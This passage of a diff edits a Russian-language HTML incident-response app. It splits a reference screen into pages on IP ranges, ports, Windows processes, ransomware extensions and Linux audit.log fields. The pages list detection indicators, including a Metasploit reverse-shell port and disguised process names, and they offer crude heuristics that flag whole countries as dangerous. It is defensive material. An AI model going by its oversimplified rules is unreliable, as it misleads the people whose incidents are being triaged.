@@ -2615,263 +2615,461 @@ cmd /c mklink /d C:\ShadowRestore &quot;$path&quot;">
 </div>
 
 <!-- ==================== ЭКРАН СПРАВОЧНИК ==================== -->
+<!-- ==================== ЭКРАН СПРАВОЧНИК (меню) ==================== -->
 <div id="screen-ref" class="hidden screen-inner">
   <header class="section-header">
     <button class="back-btn" onclick="goBack()" aria-label="Назад">‹</button>
     <div class="section-header-title">📚 Справочник</div>
   </header>
   <div class="section-content">
-
-    <!-- IP АДРЕСА -->
-    <div class="section-title">🌐 IP адреса — внутренние vs внешние</div>
-    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:16px">
-
-      <div style="padding:14px 16px;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✅ Внутренние — безопасно</div>
-        <div style="display:flex;flex-direction:column;gap:6px">
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--blue)">127.0.0.1</code>
-            <span style="font-size:12px;color:var(--text2)">Сам компьютер</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--blue)">192.168.x.x</code>
-            <span style="font-size:12px;color:var(--text2)">Домашняя/офисная сеть</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--blue)">10.x.x.x</code>
-            <span style="font-size:12px;color:var(--text2)">Корпоративная сеть</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--blue)">172.16–31.x.x</code>
-            <span style="font-size:12px;color:var(--text2)">Корпоративная сеть</span>
-          </div>
+    <div class="section-title">Выбери раздел</div>
+    <div class="menu-grid">
+      <button class="menu-btn primary" onclick="openSection('ref-ip')">
+        <div class="btn-icon">🌐</div>
+        <div class="btn-info">
+          <div class="btn-title">IP адреса</div>
+          <div class="btn-desc">Внутренние vs внешние · Как проверить</div>
         </div>
-      </div>
-
-      <div style="padding:14px 16px;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:8px">🚨 Внешние — проверять</div>
-        <div style="font-size:13px;color:var(--text2);margin-bottom:8px">Всё что не попадает в список выше — внешний IP. Смотришь на первые цифры:</div>
-        <div style="display:flex;flex-direction:column;gap:6px">
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red)">185.x.x.x</code>
-            <span style="font-size:12px;color:var(--red)">Часто VPN/хакеры</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red)">45.x.x.x</code>
-            <span style="font-size:12px;color:var(--red)">Проверить</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green)">8.8.8.8</code>
-            <span style="font-size:12px;color:var(--green)">Google DNS — норма</span>
-          </div>
+        <div class="btn-arrow">›</div>
+      </button>
+      <button class="menu-btn primary" onclick="openSection('ref-ports')">
+        <div class="btn-icon">🔌</div>
+        <div class="btn-info">
+          <div class="btn-title">Порты</div>
+          <div class="btn-desc">Хакерские · Опасные · Нормальные</div>
         </div>
-      </div>
-
-      <div style="padding:14px 16px">
-        <div style="font-size:13px;font-weight:700;color:var(--text);margin-bottom:8px">Как проверить внешний IP:</div>
-        <div style="display:flex;flex-direction:column;gap:6px">
-          <div style="padding:10px 12px;background:var(--bg3);border-radius:6px">
-            <div style="font-size:12px;font-weight:700;color:var(--text)">🟢 Норма</div>
-            <div style="font-size:12px;color:var(--text2);margin-top:2px">Россия + известная компания (Yandex, Mail, Rostelecom)</div>
-          </div>
-          <div style="padding:10px 12px;background:#fffbeb;border-radius:6px">
-            <div style="font-size:12px;font-weight:700;color:var(--yellow)">⚠️ Подозрительно</div>
-            <div style="font-size:12px;color:var(--text2);margin-top:2px">Нидерланды / Молдова / Румыния / анонимный хостинг</div>
-          </div>
-          <div style="padding:10px 12px;background:#fef2f2;border-radius:6px">
-            <div style="font-size:12px;font-weight:700;color:var(--red)">🚨 Очень подозрительно</div>
-            <div style="font-size:12px;color:var(--text2);margin-top:2px">Китай / Северная Корея / VPN сервис / Tor выходной узел</div>
-          </div>
+        <div class="btn-arrow">›</div>
+      </button>
+      <button class="menu-btn primary" onclick="openSection('ref-proc')">
+        <div class="btn-icon">⚙️</div>
+        <div class="btn-info">
+          <div class="btn-title">Процессы Windows</div>
+          <div class="btn-desc">Норма · Маскировка · Красные флаги</div>
         </div>
-        <button class="copy-btn" onclick="copyData(this)" data-copy="2ip.ru" style="margin-top:10px">
-          <div class="copy-icon">🌐</div>
-          <div class="copy-info">
-            <div class="copy-title">Проверить IP онлайн</div>
-            <div class="copy-code">2ip.ru — введи IP и узнай страну и организацию</div>
-          </div>
-          <div class="copy-badge">✓</div>
-        </button>
-      </div>
+        <div class="btn-arrow">›</div>
+      </button>
+      <button class="menu-btn primary" onclick="openSection('ref-virus')">
+        <div class="btn-icon">🔒</div>
+        <div class="btn-info">
+          <div class="btn-title">Шифровальщики</div>
+          <div class="btn-desc">Расширения · Семейства · Дешифраторы</div>
+        </div>
+        <div class="btn-arrow">›</div>
+      </button>
+      <button class="menu-btn primary" onclick="openSection('ref-audit')">
+        <div class="btn-icon">🐧</div>
+        <div class="btn-info">
+          <div class="btn-title">Linux audit.log</div>
+          <div class="btn-desc">Что искать · Ключевые поля · Алгоритм</div>
+        </div>
+        <div class="btn-arrow">›</div>
+      </button>
+      <button class="menu-btn neutral" onclick="openSection('ref-sites')">
+        <div class="btn-icon">🔗</div>
+        <div class="btn-info">
+          <div class="btn-title">Полезные сайты</div>
+          <div class="btn-desc">ID Ransomware · VirusTotal · 2ip.ru</div>
+        </div>
+        <div class="btn-arrow">›</div>
+      </button>
     </div>
+  </div>
+</div>
 
-    <!-- ПОРТЫ -->
-    <div class="section-title">🔌 Порты — что значит каждый</div>
+<!-- ==================== СПРАВОЧНИК: IP ==================== -->
+<div id="screen-ref-ip" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">🌐 IP адреса</div>
+  </header>
+  <div class="section-content">
+    <div class="section-title">Внутренние — безопасно</div>
     <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:16px">
-
-      <div style="padding:14px 16px;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:8px">🚨 Хакерские порты — тревога</div>
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">4444</code>
-            <span style="font-size:12px;color:var(--text2)">Metasploit reverse shell</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">1337</code>
-            <span style="font-size:12px;color:var(--text2)">Классический хакерский порт</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">31337</code>
-            <span style="font-size:12px;color:var(--text2)">Back Orifice троян</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">9001, 9030</code>
-            <span style="font-size:12px;color:var(--text2)">Tor сеть</span>
-          </div>
+      <div style="padding:14px 16px;display:flex;flex-direction:column;gap:6px">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
+          <code style="font-size:13px;color:var(--green);font-weight:700">127.0.0.1</code>
+          <span style="font-size:12px;color:var(--text2)">Сам компьютер (localhost)</span>
         </div>
-      </div>
-
-      <div style="padding:14px 16px;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;font-weight:700;color:var(--yellow);margin-bottom:8px">⚠️ Проверить контекст</div>
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fffbeb;border-radius:6px">
-            <code style="font-size:12px;color:var(--yellow);font-weight:700">3389</code>
-            <span style="font-size:12px;color:var(--text2)">RDP — если открыт в интернет → опасно</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fffbeb;border-radius:6px">
-            <code style="font-size:12px;color:var(--yellow);font-weight:700">5900</code>
-            <span style="font-size:12px;color:var(--text2)">VNC — удалённый доступ</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fffbeb;border-radius:6px">
-            <code style="font-size:12px;color:var(--yellow);font-weight:700">23</code>
-            <span style="font-size:12px;color:var(--text2)">Telnet — устаревший, небезопасный</span>
-          </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
+          <code style="font-size:13px;color:var(--green);font-weight:700">192.168.x.x</code>
+          <span style="font-size:12px;color:var(--text2)">Домашняя/офисная сеть</span>
         </div>
-      </div>
-
-      <div style="padding:14px 16px">
-        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✅ Обычно норма</div>
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">443</code>
-            <span style="font-size:12px;color:var(--text2)">HTTPS — браузер, обновления</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">80</code>
-            <span style="font-size:12px;color:var(--text2)">HTTP — браузер</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">53</code>
-            <span style="font-size:12px;color:var(--text2)">DNS — разрешение имён</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">25, 465, 587</code>
-            <span style="font-size:12px;color:var(--text2)">Email (SMTP)</span>
-          </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
+          <code style="font-size:13px;color:var(--green);font-weight:700">10.x.x.x</code>
+          <span style="font-size:12px;color:var(--text2)">Корпоративная сеть</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
+          <code style="font-size:13px;color:var(--green);font-weight:700">172.16–31.x.x</code>
+          <span style="font-size:12px;color:var(--text2)">Корпоративная сеть</span>
         </div>
       </div>
     </div>
 
-    <!-- СИСТЕМНЫЕ ПРОЦЕССЫ -->
-    <div class="section-title">⚙️ Процессы — норма vs подозрительно</div>
-    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:16px">
-
-      <div style="padding:14px 16px;border-bottom:1px solid var(--border)">
-        <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:8px">✅ Системные — не трогать</div>
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">svchost.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Службы Windows — норма</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">lsass.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Аутентификация — норма</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">explorer.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Рабочий стол Windows</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">services.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Менеджер служб</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#f0fdf4;border-radius:6px">
-            <code style="font-size:12px;color:var(--green);font-weight:700">csrss.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Подсистема Windows</span>
-          </div>
-        </div>
+    <div class="section-title">Внешние — проверять</div>
+    <div class="alert-card red" style="margin-bottom:12px">
+      <div class="alert-title">Всё что не попадает в список выше</div>
+      <ul class="alert-list">
+        <li>Смотришь на первые цифры адреса</li>
+        <li>Не 192.168 / не 10. / не 127. = внешний</li>
+      </ul>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="padding:10px 12px;background:#f0fdf4;border-radius:6px">
+        <div style="font-size:12px;font-weight:700;color:var(--green)">✅ Норма</div>
+        <div style="font-size:12px;color:var(--text2);margin-top:2px">Россия + известная компания (Yandex, Mail, Rostelecom)</div>
       </div>
-
-      <div style="padding:14px 16px">
-        <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:8px">🚨 Маскировка под системные</div>
-        <div style="font-size:12px;color:var(--text2);margin-bottom:8px">Вирусы часто называют себя похоже на системные процессы:</div>
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">svch0st.exe</code>
-            <span style="font-size:12px;color:var(--text2)">0 вместо o — вирус</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">svchost32.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Цифра в конце — вирус</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">lsasss.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Лишняя буква — вирус</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;padding:7px 10px;background:#fef2f2;border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">explоrer.exe</code>
-            <span style="font-size:12px;color:var(--text2)">Кириллическая о — вирус</span>
-          </div>
-        </div>
-        <div class="alert-card yellow" style="margin-top:10px">
-          <div class="alert-title">Правило</div>
-          <ul class="alert-list">
-            <li>Настоящий svchost всегда в C:\Windows\System32\</li>
-            <li>Если путь другой — это вирус даже если имя правильное</li>
-          </ul>
-        </div>
+      <div style="padding:10px 12px;background:#fffbeb;border-radius:6px">
+        <div style="font-size:12px;font-weight:700;color:var(--yellow)">⚠️ Подозрительно</div>
+        <div style="font-size:12px;color:var(--text2);margin-top:2px">Нидерланды / Молдова / Румыния / анонимный хостинг</div>
+      </div>
+      <div style="padding:10px 12px;background:#fef2f2;border-radius:6px">
+        <div style="font-size:12px;font-weight:700;color:var(--red)">🚨 Опасно</div>
+        <div style="font-size:12px;color:var(--text2);margin-top:2px">Китай / Северная Корея / VPN / Tor выходной узел</div>
       </div>
     </div>
+    <button class="copy-btn" onclick="copyData(this)" data-copy="2ip.ru">
+      <div class="copy-icon">🌐</div>
+      <div class="copy-info">
+        <div class="copy-title">Проверить IP онлайн → 2ip.ru</div>
+        <div class="copy-code">Скопируй адрес → вставь на сайте</div>
+      </div>
+      <div class="copy-badge">✓</div>
+    </button>
+  </div>
+</div>
 
-    <!-- РАСШИРЕНИЯ ВИРУСОВ -->
-    <div class="section-title">🔒 Расширения шифровальщиков</div>
-    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-bottom:16px">
-      <div style="padding:14px 16px">
-        <div style="display:flex;flex-direction:column;gap:4px">
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.locked</code>
-            <span style="font-size:12px;color:var(--text2)">Несколько семейств → nomoreransom</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.WNCRY</code>
-            <span style="font-size:12px;color:var(--text2)">WannaCry → есть дешифратор</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.ryuk</code>
-            <span style="font-size:12px;color:var(--text2)">Ryuk → серьёзная группа, дешифратора нет</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.conti</code>
-            <span style="font-size:12px;color:var(--text2)">Conti → крупный бизнес, нет дешифратора</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.encrypted</code>
-            <span style="font-size:12px;color:var(--text2)">Несколько семейств → nomoreransom</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;background:var(--bg3);border-radius:6px">
-            <code style="font-size:12px;color:var(--red);font-weight:700">.dharma</code>
-            <span style="font-size:12px;color:var(--text2)">Dharma → частично есть дешифратор</span>
-          </div>
-        </div>
-        <div class="alert-card blue" style="margin-top:10px">
-          <div class="alert-title">Всегда проверяй на этих сайтах</div>
-          <ul class="alert-list">
-            <li>id-ransomware.malwarehunterteam.com → загрузи файл с требованием</li>
-            <li>nomoreransom.org → ищи бесплатный дешифратор</li>
-          </ul>
-        </div>
+<!-- ==================== СПРАВОЧНИК: ПОРТЫ ==================== -->
+<div id="screen-ref-ports" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">🔌 Порты</div>
+  </header>
+  <div class="section-content">
+    <div class="section-title">Хакерские — тревога</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:14px;color:var(--red);font-weight:800">4444</code>
+        <span style="font-size:12px;color:var(--text2)">Metasploit reverse shell</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:14px;color:var(--red);font-weight:800">1337</code>
+        <span style="font-size:12px;color:var(--text2)">Классический хакерский</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:14px;color:var(--red);font-weight:800">31337</code>
+        <span style="font-size:12px;color:var(--text2)">Back Orifice троян</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:14px;color:var(--red);font-weight:800">9001, 9030</code>
+        <span style="font-size:12px;color:var(--text2)">Tor сеть</span>
       </div>
     </div>
+    <div class="section-title">Проверить контекст</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fffbeb;border-radius:6px">
+        <code style="font-size:14px;color:var(--yellow);font-weight:800">3389</code>
+        <span style="font-size:12px;color:var(--text2)">RDP — если снаружи = опасно</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fffbeb;border-radius:6px">
+        <code style="font-size:14px;color:var(--yellow);font-weight:800">22</code>
+        <span style="font-size:12px;color:var(--text2)">SSH — если снаружи = проверить</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fffbeb;border-radius:6px">
+        <code style="font-size:14px;color:var(--yellow);font-weight:800">5900</code>
+        <span style="font-size:12px;color:var(--text2)">VNC — удалённый доступ</span>
+      </div>
+    </div>
+    <div class="section-title">Норма — не беспокоиться</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:14px;color:var(--green);font-weight:800">443</code>
+        <span style="font-size:12px;color:var(--text2)">HTTPS — браузер, обновления</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:14px;color:var(--green);font-weight:800">80</code>
+        <span style="font-size:12px;color:var(--text2)">HTTP — браузер</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:14px;color:var(--green);font-weight:800">53</code>
+        <span style="font-size:12px;color:var(--text2)">DNS — разрешение имён</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:14px;color:var(--green);font-weight:800">25, 465, 587</code>
+        <span style="font-size:12px;color:var(--text2)">Email (SMTP)</span>
+      </div>
+    </div>
+  </div>
+</div>
 
-    <!-- ПОЛЕЗНЫЕ САЙТЫ -->
-    <div class="section-title">🔗 Полезные сайты</div>
+<!-- ==================== СПРАВОЧНИК: ПРОЦЕССЫ ==================== -->
+<div id="screen-ref-proc" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">⚙️ Процессы Windows</div>
+  </header>
+  <div class="section-content">
+    <div class="section-title">Системные — не трогать</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:13px;color:var(--green);font-weight:700">svchost.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Службы Windows</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:13px;color:var(--green);font-weight:700">lsass.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Аутентификация</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:13px;color:var(--green);font-weight:700">explorer.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Рабочий стол</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:13px;color:var(--green);font-weight:700">services.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Менеджер служб</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#f0fdf4;border-radius:6px">
+        <code style="font-size:13px;color:var(--green);font-weight:700">csrss.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Подсистема Windows</span>
+      </div>
+    </div>
+    <div class="section-title">Маскировка под системные</div>
+    <div class="alert-card yellow" style="margin-bottom:12px">
+      <div class="alert-title">Правило</div>
+      <ul class="alert-list">
+        <li>Настоящий svchost всегда в C:\Windows\System32\</li>
+        <li>Если путь другой — вирус даже если имя правильное</li>
+      </ul>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">svch0st.exe</code>
+        <span style="font-size:12px;color:var(--text2)">0 вместо o</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">svchost32.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Цифра в конце</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">lsasss.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Лишняя буква</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">explоrer.exe</code>
+        <span style="font-size:12px;color:var(--text2)">Кириллическая «о»</span>
+      </div>
+    </div>
+    <div class="section-title">Красные флаги</div>
+    <div class="alert-card red">
+      <ul class="alert-list">
+        <li>Процесс из Temp / AppData / ProgramData</li>
+        <li>PowerShell или cmd → внешний IP</li>
+        <li>Незнакомый процесс → порты 4444, 1337</li>
+        <li>Много CPU без видимой причины</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== СПРАВОЧНИК: ВИРУСЫ ==================== -->
+<div id="screen-ref-virus" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">🔒 Шифровальщики</div>
+  </header>
+  <div class="section-content">
+    <div class="section-title">Расширения зашифрованных файлов</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.locked</code>
+        <span style="font-size:12px;color:var(--text2)">Несколько семейств</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.WNCRY</code>
+        <span style="font-size:12px;color:var(--green)">WannaCry → есть дешифратор</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.ryuk</code>
+        <span style="font-size:12px;color:var(--red)">Ryuk → нет дешифратора</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.conti</code>
+        <span style="font-size:12px;color:var(--red)">Conti → нет дешифратора</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.dharma</code>
+        <span style="font-size:12px;color:var(--yellow)">Dharma → частично есть</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">.encrypted</code>
+        <span style="font-size:12px;color:var(--text2)">Несколько семейств</span>
+      </div>
+    </div>
+    <div class="alert-card blue">
+      <div class="alert-title">Первые шаги при неизвестном расширении</div>
+      <ul class="alert-list">
+        <li>id-ransomware.malwarehunterteam.com → загрузи файл требования</li>
+        <li>nomoreransom.org → найди бесплатный дешифратор</li>
+        <li>Не платить выкуп — нет гарантий</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== СПРАВОЧНИК: AUDIT.LOG ==================== -->
+<div id="screen-ref-audit" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">🐧 Linux audit.log</div>
+  </header>
+  <div class="section-content">
+
+    <div class="alert-card blue" style="margin-bottom:16px">
+      <div class="alert-title">Что такое audit.log</div>
+      <ul class="alert-list">
+        <li>Журнал безопасности Linux (аналог EventLog в Windows)</li>
+        <li>Записывает входы, команды, файлы, сетевые соединения</li>
+        <li>Читается текстовым редактором или grep</li>
+      </ul>
+    </div>
+
+    <div class="section-title">Ключевые поля</div>
     <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">acct=</code>
+          <span style="font-size:11px;color:var(--text3)">имя пользователя</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">Кого атакуют или кто вошёл</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">acct="btlo" → пользователь btlo</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">addr=</code>
+          <span style="font-size:11px;color:var(--text3)">IP адрес</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">Откуда пришло подключение</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">addr=192.168.4.155 → IP атакующего</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">res=</code>
+          <span style="font-size:11px;color:var(--text3)">результат</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">Успешно или нет</div>
